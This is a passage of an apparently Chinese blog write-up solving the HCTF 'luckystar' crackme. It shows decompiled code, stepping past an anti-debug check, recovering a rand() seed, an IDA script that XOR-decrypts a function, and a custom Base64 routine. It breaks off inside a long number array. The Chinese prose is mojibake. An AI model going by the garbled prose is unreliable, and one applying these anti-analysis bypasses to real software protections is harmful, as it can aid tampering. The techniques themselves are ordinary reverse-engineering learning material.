<span class="string">&#x27;hctf&#x27;</span>;</span><br><span class="line">  v2 = v1 - <span class="number">17044</span>;</span><br><span class="line">  (*(v1 - <span class="number">17044</span>))(v5);</span><br><span class="line">  (*(v2 - <span class="number">4</span>))();</span><br><span class="line">  <span class="keyword">return</span> &amp;unk_407384;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>â€œhctfâ€ å››ä¸ªå¤§å­—æ‘†åœ¨è¿™é‡Œï¼Œè¿™ä¸ªå‡½æ•°åº”è¯¥æ¯”è¾ƒé‡è¦ã€‚<br>ä¸å·§çš„æ˜¯å‡½æ•°é‡Œè°ƒç”¨äº† 3 ä¸ªè™šå‡½æ•°ï¼Œé™æ€æ²¡åŠæ³•ç¡®å®šå®ƒä»¬æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯ä½¿ç”¨ OD è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç›´æ¥è¿è¡Œå°±å¯ä»¥æ–­åœ¨è¿™é‡Œï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar3.png"
                      alt="image"
                ></p>
<p>å•æ­¥å°±å¯ä»¥ç¡®å®šä¸‰ä¸ªå‡½æ•°æ˜¯ä»€ä¹ˆäº†ï¼Œç¬¬ä¸€ä¸ªæ˜¯åè°ƒè¯•ï¼Œè°ƒç”¨äº† checkremotedebuggerpresent è¿›è¡Œæ£€æµ‹ï¼Œè¿™ä¸ªå¯ä»¥ä¸ç®¡ä»–ï¼Œç›´æ¥æ­¥è¿‡å°±å¥½ï¼Œä¸‹é¢ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«æ˜¯ srand å’Œ randï¼Œå¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯åœ¨è¿™é‡Œå°†éšæœºæ•°ç§å­æ¢æ‰äº†ï¼Œé‚£æ¢æˆä»€ä¹ˆäº†å‘¢ï¼ŸåŠ¨æ€è°ƒè¯•å‘ç°è¢«æ¢æˆäº† 0x10001165 ï¼Œä½†æ˜¯å¦‚æœæ‹¿è¿™ä¸ªç§å­ç”Ÿæˆéšæœºæ•°å»è§£å¯†ç¬¬äºŒä¸ªå‡½æ•°çš„è¯ï¼Œè§£å‡ºæ¥çš„éƒ½æ˜¯é”™è¯¯ä»£ç ï¼Œè¯´æ˜éšæœºæ•°ç§å­ä¸åº”è¯¥æ˜¯å®ƒï¼Œé‚£ä¹ˆçŒœæƒ³åº”è¯¥æ˜¯ 0x68637466 ï¼Œå³ â€œhctfâ€ï¼Œç»éªŒè¯æ˜¯æ­£ç¡®çš„ã€‚<br>å†æ¬¡ç¼–å†™ä¸¤ä¸ªå°ç¨‹åºå»è§£å¯†å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(<span class="number">0x68637466</span>);</span><br><span class="line">    <span class="type">int</span> token[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        token[i] = rand() % <span class="number">0x2018</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>,token[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">0x417000</span></span><br><span class="line">b = a + <span class="number">8327168</span></span><br><span class="line">select = []</span><br><span class="line"><span class="keyword">while</span> a &lt;=b :</span><br><span class="line">    select.append(Byte(a))</span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line">token2 = [*]</span><br><span class="line">v11 = <span class="number">0x4015e0</span></span><br><span class="line">v12 = <span class="number">383</span></span><br><span class="line">tt = <span class="number">1</span>    <span class="comment"># æ³¨æ„è¿™ä¸ªæ˜¯ 1 ï¼ï¼ï¼</span></span><br><span class="line"><span class="keyword">while</span> v12 &gt; <span class="number">0</span>:</span><br><span class="line">    v11 = v11 + <span class="number">1</span></span><br><span class="line">    PatchByte(v11 - <span class="number">1</span>, Byte(v11 - <span class="number">1</span>) ^ select[token2[tt]])</span><br><span class="line">    tt += <span class="number">1</span></span><br><span class="line">    v12 -= <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å°±å¯ä»¥æŠŠç¬¬äºŒä¸ªå‡½æ•°è§£å¯†å‡ºæ¥äº†ï¼  </p>
<p>ç°åœ¨æ•´ä¸ªç¨‹åºçš„ä¸»è¦é€»è¾‘å·²ç»è¢«å®Œå…¨è§£å¯†ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4015E0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v14; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v19; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v20; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">4</span> * v3 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v4 &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &amp; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = a1[v2 - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = a1[v2++];</span><br><span class="line">          v7 = (v9 &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (v8 &amp; <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = a1[v2++];</span><br><span class="line">          v7 = (v10 &gt;&gt; <span class="number">6</span>) | <span class="number">4</span> * (v8 &amp; <span class="number">0xF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v8 &amp; <span class="number">0x3F</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = &amp;a1[v2++];</span><br><span class="line">        v7 = *v6 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a2[v4++] = byte_4033C8[v7];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; v20 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">4</span> * v3 / <span class="number">3</span>;</span><br><span class="line">    v12 = <span class="number">16</span> * (a1[v2 - <span class="number">1</span>] &amp; <span class="number">3</span>);</span><br><span class="line">    *&amp;a2[v20 + <span class="number">1</span>] = <span class="number">15677</span>;</span><br><span class="line">    v13 = byte_4033C8[v12];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) % <span class="number">3</span> != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    v11 = <span class="number">4</span> * v3 / <span class="number">3</span>;</span><br><span class="line">    v13 = byte_4033C8[<span class="number">4</span> * (a1[v2 - <span class="number">1</span>] &amp; <span class="number">0xF</span>)];</span><br><span class="line">    a2[v20 + <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a2[v11] = v13;</span><br><span class="line">LABEL_15:</span><br><span class="line">  a2[<span class="built_in">strlen</span>(a2)] = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = rand() % <span class="number">4</span>;</span><br><span class="line">        v18 = v16;</span><br><span class="line">        v16 -= <span class="number">2</span>;</span><br><span class="line">        result = v17 &lt;&lt; v18;</span><br><span class="line">        a2[v14] ^= result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v16 &gt; <span class="number">-2</span> );</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v14 &lt; v19 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹è¾“å…¥çš„ flag åšä¸€æ¬¡ BASE64 ç¼–ç ï¼Œæ³¨æ„è¿™é‡Œçš„è¡¨ç›˜è¢«æ¢æ‰äº†ï¼Œç„¶åå–éšæœºæ•°å¯¹æ¯ä¸ªå­—èŠ‚å¼‚æˆ– 4 æ¬¡ï¼Œå¾ªç¯è¿›è¡Œï¼Œç›´åˆ°æ‰€æœ‰å­—ç¬¦å¤„ç†å®Œæ¯•ã€‚<br>ç®—æ³•å¾ˆç®€å•ï¼Œç”±äºå¼‚æˆ–å¯é€†ï¼Œé‚£ä¹ˆç°åœ¨åªç¼ºå°‘å¯†æ–‡äº†ï¼Œè§‚å¯Ÿç¬¬ä¸€ä¸ªè§£å¯†å‡ºæ¥çš„å‡½æ•°å‘ç°ï¼Œæ¯”è¾ƒ flag æ˜¯å¦æ­£ç¡®çš„ä»£ç å°±åœ¨å…¶ä¸­ï¼Œé‚£ä¹ˆé€šè¿‡åŠ¨æ€è°ƒè¯•å°±èƒ½æ‹¿åˆ°å¯†æ–‡ï¼<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar4.png"
                      alt="image"
                ></p>
<p>å°†å¯†æ–‡æŠ½å–å‡ºæ¥ï¼Œé€šè¿‡é€†å‘ç®—æ³•å¯ä»¥æ‹¿åˆ° BASE64 ç¼–ç åçš„ flagï¼ˆæ³¨æ„éšæœºæ•°çš„èµ·å§‹ä½ç½®ï¼‰ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v14 = <span class="number">0</span></span><br><span class="line">token = [<span class="number">0x59c4</span>,<span class="number">0x124</span>,<span class="number">0xb5a</span>,<span class="number">0x29a4</span>,<span class="number">0x1e32</span>,<span class="number">0x7fb4</span>,<span class="number">0x5560</span>,<span class="number">0x7eb5</span>,<span class="number">0x78d4</span>,<span class="number">0x88f</span>,<span class="number">0x7dc6</span>,<span class="number">0x14d9</span>,<span class="number">0x7faa</span>,<span class="number">0x3288</span>,<span class="number">0x75ab</span>,<span class="number">0x3801</span>,<span class="number">0x30f1</span>,<span class="number">0x1cb8</span>,<span class="number">0x524c</span>,<span class="number">0x10c4</span>,<span class="number">0x19f4</span>,<span class="number">0x4a0c</span>,<span class="number">0x4a7a</span>,<span class="number">0x7c01</span>,<span class="number">0x6025</span>,<span class="number">0x5600</span>,<span class="number">0x284c</span>,<span class="number">0x5c6</span>,<span class="number">0x606c</span>,<span class="number">0x66a9</span>,<span class="number">0x311</span>,<span class="number">0xb70</span>,<span class="number">0x58bf</span>,<span class="number">0x7ff9</span>,<span class="number">0x5588</span>,<span class="number">0x4914</span>,<span class="number">0x4ff3</span>,<span class="number">0x1c3f</span>,<span class="number">0x4454</span>,<span class="number">0x561e</span>,<span class="number">0x2fd2</span>,<span class="number">0x2ded</span>,<span class="number">0x28aa</span>,<span class="number">0x5538</span>,<span class="number">0x456d</span>,<span class="number">0x6e9e</span>,<span class="number">0x334d</span>,<span class="number">0x5b6e</span>,<span class="number">0x1bb4</span>,<span class="number">0x1f57</span>,<span class="number">0x3bbc</span>,<span class="number">0x528f</span>,<span class="number">0x6443</span>,<span class="number">0x1e0d</span>,<span class="number">0xfa9</span>,<span class="number">0x5ad6</span>,<span class="number">0x627f</span>,<span class="number">0x7468</span>,<span class="number">0x56ae</span>,<span class="number">0x6fc9</span>,<span class="number">0xce2</span>,<span class="number">0x43c7</span>,<span class="number">0x5e3c</span>,<span class="number">0x5462</span>,<span class="number">0x5893</span>,<span class="number">0x3284</span>,<span class="number">0x61d4</span>,<span class="number">0xa6d</span>,<span class="number">0x633a</span>,<span class="number">0x3e79</span>,<span class="number">0x2379</span>,<span class="number">0x5931</span>,<span class="number">0x6f12</span>,<span class="number">0x18c3</span>,<span class="number">0x6865</span>,<span class="number">0x2752</span>,<span class="number">0x6540</span>,<span class="number">0x6ec5</span>,<span class="number">0x2dfb</span>,<span class="number">0x2bf6</span>,<span class="number">0x5263</span>,<span class="number">0x4470</span>,<span class="number">0x2afd</span>,<span class="number">0x3b27</span>,<span class="number">0x116c</span>,<span class="number">0x43c2</span>,<span class="number">0x70ff</span>,<span class="number">0x3179</span>,<span class="number">0x18b0</span>,<span class="number">0x258d</span>,<span class="number">0x421b</span>,<span class="number">0x42ec</span>,<span class="number">0x1d3b</span>,<span class="number">0x177a</span>,<span class="number">0x6ee7</span>,<span class="number">0x3113</span>,<span class="number">0x67</span>,<span class="number">0x434d</span>,<span class="number">0x50a4</span>,<span class="number">0x2c76</span>,<span class="number">0x3bae</span>,<span class="number">0x5b6b</span>,<span class="number">0x33b8</span>,<span class="number">0x6536</span>,<span class="number">0x3ebd</span>,<span class="number">0x5099</span>,<span class="number">0x465f</span>,<span class="number">0xeef</span>,<span class="number">0x73c9</span>,<span class="number">0x1506</span>,<span class="number">0x5f9d</span>,<span class="number">0x5be2</span>,<span class="number">0x5e26</span>,<span class="number">0x108c</span>,<span class="number">0x3277</span>,<span class="number">0x3354</span>,<span class="number">0x716</span>,<span class="number">0x2a33</span>,<span class="number">0x4162</span>,<span class="number">0x2731</span>,<span class="number">0x2cdf</span>,<span class="number">0xaf7</span>,<span class="number">0x25fc</span>,<span class="number">0x6cf5</span>,<span class="number">0x6820</span>,<span class="number">0x7dcb</span>,<span class="number">0xfa</span>,<span class="number">0x5dcc</span>,<span class="number">0x3b64</span>,<span class="number">0x10dd</span>,<span class="number">0x2661</span>,<span class="number">0x41f8</span>,<span class="number">0x40f8</span>,<span class="number">0x5c1c</span>,<span class="number">0x59fa</span>,<span class="number">0x6b74</span>,<span class="number">0x6afa</span>,<span class="number">0x10f8</span>,<span class="number">0x2fff</span>,<span class="number">0x63d7</span>,<span class="number">0x9b3</span>,<span class="number">0x3768</span>,<span class="number">0x661b</span>,<span class="number">0x317a</span>,<span class="number">0xc27</span>,<span class="number">0x3c32</span>,<span class="number">0x4892</span>,<span class="number">0x77dd</span>,<span class="number">0x2ee9</span>,<span class="number">0x3467</span>,<span class="number">0x77bb</span>,<span class="number">0x7747</span>,<span class="number">0xd34</span>,<span class="number">0x7a2c</span>,<span class="number">0x21b7</span>,<span class="number">0x2fad</span>,<span class="number">0x4838</span>,<span class="number">0x6c0</span>,<span class="number">0x45d</span>,<span class="number">0x2ad5</span>,<span class="number">0x38b2</span>,<span class="number">0x2dbb</span>,<span class="number">0x4b74</span>,<span class="number">0x31bc</span>,<span class="number">0x5ebf</span>,<span class="number">0x1d94</span>,<span class="number">0x1f25</span>,<span class="number">0x7134</span>,<span class="number">0x3f2</span>,<span class="number">0x4966</span>,<span class="number">0x76af</span>,<span class="number">0x51d1</span>,<span class="number">0x43a4</span>,<span class="number">0x1ff4</span>,<span class="number">0x35d</span>,<span class="number">0x706</span>,<span class="number">0x6d8b</span>,<span class="number">0x33ea</span>,<span class="number">0x47b6</span>,<span class="number">0x198c</span>,<span class="number">0x768f</span>,<span class="number">0x3966</span>,<span class="number">0x2ef3</span>,<span class="number">0x7103</span>,<span class="number">0x6bd8</span>,<span class="number">0x7cb6</span>,<span class="number">0x38b6</span>,<span class="number">0x20dc</span>,<span class="number">0x1c2c</span>,<span class="number">0x3664</span>,<span class="number">0xcf8</span>,<span class="number">0x7c76</span>,<span class="number">0x6b78</span>,<span class="number">0x606f</span>,<span class="number">0xc43</span>,<span class="number">0x3687</span>,<span class="number">0x4ac</span>,<span class="number">0x70dc</span>,<span class="number">0x3022</span>,<span class="number">0xfbe</span>,<span class="number">0x5dcc</span>,<span class="number">0x1d6d</span>,<span class="number">0x4fd7</span>,<span class="number">0x58a7</span>,<span class="number">0x4244</span>,<span class="number">0xcb1</span>,<span class="number">0x1d4b</span>,<span class="number">0x4ace</span>,<span class="number">0x577d</span>,<span class="number">0x183d</span>,<span class="number">0x6e4b</span>,<span class="number">0x7d27</span>,<span class="number">0x4fad</span>,<span class="number">0x438</span>,<span class="number">0x25f0</span>,<span class="number">0x77ad</span>,<span class="number">0x3ef3</span>,<span class="number">0x501d</span>,<span class="number">0x525f</span>,<span class="number">0x2a4a</span>,<span class="number">0x46a3</span>,<span class="number">0x4bc</span>,<span class="number">0x52b3</span>,<span class="number">0x4af7</span>,<span class="number">0xadf</span>,<span class="number">0x2382</span>,<span class="number">0x1938</span>,<span class="number">0x5f24</span>,<span class="number">0x2667</span>,<span class="number">0x1afb</span>,<span class="number">0x5dda</span>,<span class="number">0x745a</span>,<span class="number">0x10b1</span>,<span class="number">0x6495</span>,<span class="number">0x54dd</span>,<span class="number">0x4c1f</span>,<span class="number">0x2a3d</span>,<span class="number">0x2fa7</span>,<span class="number">0x3dce</span>,<span class="number">0x7f1a</span>,<span class="number">0x6323</span>,<span class="number">0x3db1</span>,<span class="number">0x5eb9</span>,<span class="number">0x5b77</span>,<span class="number">0x2fee</span>,<span class="number">0x53e6</span>,<span class="number">0x3f9c</span>,<span class="number">0x28d</span>,<span class="number">0x40ac</span>,<span class="number">0x65e7</span>,<span class="number">0x3a1c</span>,<span class="number">0x9be</span>,<span class="number">0x2e46</span>,<span class="number">0x5dd2</span>,<span class="number">0x3177</span>,<span class="number">0x229f</span>,<span class="number">0x120e</span>,<span class="number">0x257b</span>,<span class="number">0x6ba</span>,<span class="number">0xe59</span>,<span class="number">0x3b97</span>,<span class="number">0x54f9</span>,<span class="number">0x1d34</span>,<span class="number">0x6050</span>,<span class="number">0x78c9</span>,<span class="number">0x2a65</span>,<span class="number">0x32a</span>,<span class="number">0x5402</span>,<span class="number">0x2434</span>,<span class="number">0x2ede</span>,<span class="number">0x12cc</span>,<span class="number">0x3a31</span>,<span class="number">0x6da5</span>,<span class="number">0x2cd0</span>,<span class="number">0x1f68</span>,<span class="number">0x4144</span>,<span class="number">0x10f7</span>,<span class="number">0x5b76</span>,<span class="number">0x2de</span>,<span class="number">0x1ceb</span>,<span class="number">0x6f2c</span>,<span class="number">0x639e</span>,<span class="number">0x1f54</span>,<span class="number">0x5102</span>,<span class="number">0x3dbd</span>,<span class="number">0x21ad</span>,<span class="number">0x292a</span>,<span class="number">0x23b8</span>,<span class="number">0x402d</span>,<span class="number">0x48e2</span>,<span class="number">0x4d30</span>,<span class="number">0x7af0</span>,<span class="number">0x3fe4</span>,<span class="number">0x4bdf</span>,<span class="number">0x717</span>,<span class="number">0x28e7</span>,<span class="number">0x363b</span>,<span class="number">0x2e65</span>,<span class="number">0x3c26</span>,<span class="number">0x6c17</span>,<span class="number">0x5cd4</span>,<span class="number">0x245f</span>,<span class="number">0x6e2e</span>,<span class="number">0x265c</span>,<span class="number">0x182c</span>,<span class="number">0x2222</span>,<span class="number">0x1ac0</span>,<span class="number">0xf56</span>,<span class="number">0x7073</span>,<span class="number">0x41f3</span>,<span class="number">0x1a9d</span>,<span class="number">0x660e</span>,<span class="number">0xc9b</span>,<span class="number">0x22c9</span>,<span class="number">0x156e</span>,<span class="number">0x65dc</span>,<span class="number">0x63af</span>,<span class="number">0x2455</span>,<span class="number">0x5db6</span>,<span class="number">0x288</span>,<span class="number">0x1866</span>,<span class="number">0x2440</span>,<span class="number">0x4904</span>,<span class="number">0x2faf</span>,<span class="number">0x32f8</span>,<span class="number">0x20b4</span>,<span class="number">0x586d</span>,<span class="number">0x3768</span>,<span class="number">0x2d30</span>,<span class="number">0x641d</span>,<span class="number">0x4539</span>,<span class="number">0x6428</span>,<span class="number">0x4c2</span>,<span class="number">0x1e31</span>,<span class="number">0x45dd</span>,<span class="number">0x1e3</span>,<span class="number">0x47e0</span>,<span class="number">0xe2e</span>,<span class="number">0x1f2a</span>,<span class="number">0x7a74</span>,<span class="number">0x5008</span>,<span class="number">0x2262</span>,<span class="number">0x55c3</span>,<span class="number">0x113f</span>,<span class="number">0x1f20</span>,<span class="number">0x30f1</span>,<span class="number">0x13d4</span>,<span class="number">0x215</span>,<span class="number">0x12c4</span>,<span class="number">0x2dd3</span>,<span class="number">0x1701</span>,<span class="number">0x758</span>,<span class="number">0x61df</span>,<span class="number">0x21c</span>,<span class="number">0x3a9d</span>,<span class="number">0xb5f</span>,<span class="number">0x1878</span>,<span class="number">0x6880</span>,<span class="number">0x721d</span>,<span class="number">0x91b</span>,<span class="number">0x5cf</span>,<span class="number">0x7316</span>,<span class="number">0x47cc</span>,<span class="number">0x5ffb</span>,<span class="number">0x50a9</span>,<span class="number">0x1e5c</span>,<span class="number">0x33c0</span>,<span class="number">0x1f0e</span>,<span class="number">0x25e8</span>,<span class="number">0x157c</span>,<span class="number">0x5f0c</span>,<span class="number">0xb68</span>,<span class="number">0x355e</span>,<span class="number">0xbcd</span>,<span class="number">0x2737</span>,<span class="number">0x65c6</span>,<span class="number">0x70e3</span>,<span class="number">0x4f9d</span>,<span class="number">0x75ed</span>,<span class="number">0x3375</span>,<span class="number">0x41a5</span>,<span class="number">0x7a2e</span>,<span class="number">0x40f5</span>,<span class="number">0xe6f</span>,<span class="number">0x27c0</span>,<span class="number">0x60fe</span>,<span class="number">0x4663</span>,<span class="number">0x40c8</span>,<span class="number">0x780f</span>,<span class="number">0x2c4b</span>,<span class="number">0x590f</span>,<span class="number">0x2f48</span>,<span class="number">0x2c41</span>,<span class="number">0x36d7</span>,<span class="number">0x5145</span>,<span class="number">0x575a</span>,<span class="number">0x792f</span>,<span class="number">0x1ae9</span>,<span class="number">0x75be</span>,<span class="number">0x6424</span>,<span class="number">0x1f6c</span>,<span class="number">0x1094</span>,<span class="number">0x70cf</span>,<span class="number">0x1ef8</span>,<span class="number">0x2a1e</span>,<span class="number">0x13b</span>,<span class="number">0x25e1</span>,<span class="number">0x3eeb</span>,<span class="number">0x100d</span>,<span class="number">0x7455</span>,<span class="number">0x7b21</span>,<span class="number">0x5bc3</span>,<span class="number">0x6afa</span>,<span class="number">0x396e</span>,<span class="number">0x6b79</span>,<span class="number">0x817</span>,<span class="number">0x3932</span>,<span class="number">0x736e</span>,<span class="number">0x74be</span>,<span class="number">0x56b1</span>,<span class="number">0x5d63</span>,<span class="number">0x691e</span>,<span class="number">0x362b</span>,<span class="number">0x4f37</span>,<span class="number">0x50ad</span>,<span class="number">0x3ee8</span>,<span class="number">0x530e</span>,<span class="number">0x160b</span>,<span class="number">0x3afc</span>,<span class="number">0x7ddf</span>,<span class="number">0x6dc1</span>,<span class="number">0x4b6f</span>,<span class="number">0x6596</span>,<span class="number">0xbff</span>,<span class="number">0x4edc</span>,<span class="number">0x65ed</span>,<span class="number">0x3bf0</span>,<span class="number">0x79b5</span>,<span class="number">0xca9</span>,<span class="number">0xbf6</span>,<span class="number">0x4ec6</span>,<span class="number">0x48a2</span>,<span class="number">0x46d8</span>,<span class="number">0x30c9</span>,<span class="number">0xd6a</span>,<span class="number">0xf9c</span>,<span class="number">0x4a74</span>,<span class="number">0x7896</span>,<span class="number">0x295d</span>,<span class="number">0x1ff5</span>,<span class="number">0x3216</span>,<span class="number">0x27e3</span>,<span class="number">0x581c</span>,<span class="number">0x1000</span>,<span class="number">0x5659</span>,<span class="number">0x2230</span>,<span class="number">0x673c</span>,<span class="number">0x4ed2</span>,<span class="number">0x228d</span>,<span class="number">0x3bd6</span>,<span class="number">0x56b9</span>,<span class="number">0x2546</span>,<span class="number">0x21b0</span>,<span class="number">0x6335</span>,<span class="number">0x6d8c</span>,<span class="number">0x4844</span>,<span class="number">0x579a</span>,<span class="number">0x650e</span>,<span class="number">0x7c7b</span>,<span class="number">0x6042</span>,<span class="number">0x3a77</span>,<span class="number">0x502e</span>,<span class="number">0x4335</span>,<span class="number">0x2a0a</span>,<span class="number">0x607a</span>,<span class="number">0x3c4d</span>,<span class="number">0x2b9e</span>,<span class="number">0x14be</span>,<span class="number">0x35d0</span>,<span class="number">0x7835</span>,<span class="number">0x4f68</span>,<span class="number">0x11a</span>,<span class="number">0x4ed3</span>,<span class="number">0x6327</span>,<span class="number">0x7be3</span>,<span class="number">0x5fa</span>,<span class="number">0x2a81</span>,<span class="number">0x757a</span>,<span class="number">0x2816</span>,<span class="number">0x5e1c</span>,<span class="number">0x792c</span>,<span class="number">0x3c85</span>,<span class="number">0x110e</span>,<span class="number">0x6326</span>,<span class="number">0x3b72</span>,<span class="number">0x4dbf</span>,<span class="number">0x7076</span>,<span class="number">0x39eb</span>,<span class="number">0x4d70</span>,<span class="number">0x7525</span>,<span class="number">0x168</span>,<span class="number">0x13ea</span>,<span class="number">0x3233</span>,<span class="number">0x22dc</span>,<span class="number">0x4783</span>,<span class="number">0x2a17</span>,<span class="number">0x336f</span>,<span class="number">0x5c18</span>,<span class="number">0x4c3e</span>,<span class="number">0x54df</span>,<span class="number">0x2974</span>,<span class="number">0x333c</span>,<span class="number">0x467b</span>,<span class="number">0x6566</span>,<span class="number">0x7f5d</span>,<span class="number">0xb43</span>,<span class="number">0x6060</span>,<span class="number">0x2413</span>,<span class="number">0x478b</span>,<span class="number">0x2a5e</span>,<span class="number">0xf62</span>,<span class="number">0x184e</span>,<span class="number">0x7452</span>,<span class="number">0x5fde</span>,<span class="number">0x32a2</span>,<span class="number">0x7d88</span>,<span class="number">0x8f1</span>,<span class="number">0x4155</span>,<span class="number">0x6b7d</span>,<span class="number">0x97c</span>,<span class="number">0x56c8</span>,<span class="number">0x42f8</span>,<span class="number">0x645e</span>,<span class="number">0x67b5</span>,<span class="number">0x1ac5</span>,<span class="number">0x2f48</span>,<span class="number">0x79d7</span>,<span class="number">0xe51</span>,<span class="number">0xf20</span>,<span class="number">0x41f2</span>,<span class="number">0x79f1</span>,<span class="number">0x5004</span>,<span class="number">0x4548</span>,<span class="number">0x69f3</span>,<span class="number">0x6dc0</span>,<span class="number">0x4f60</span>,<span class="number">0x5c1d</span>,<span class="number">0x76ff</span>,<span class="number">0x213a</span>,<span class="number">0x3753</span>,<span class="number">0x665f</span>,<span class="number">0x3624</span>,<span class="number">0x5d49</span>,<span class="number">0x5cf1</span>,<span class="number">0x1566</span>,<span class="number">0x41ab</span>,<span class="number">0x81e</span>,<span class="number">0x2e73</span>,<span class="number">0x7c14</span>,<span class="number">0x83f</span>,<span class="number">0x1fc9</span>,<span class="number">0x1380</span>,<span 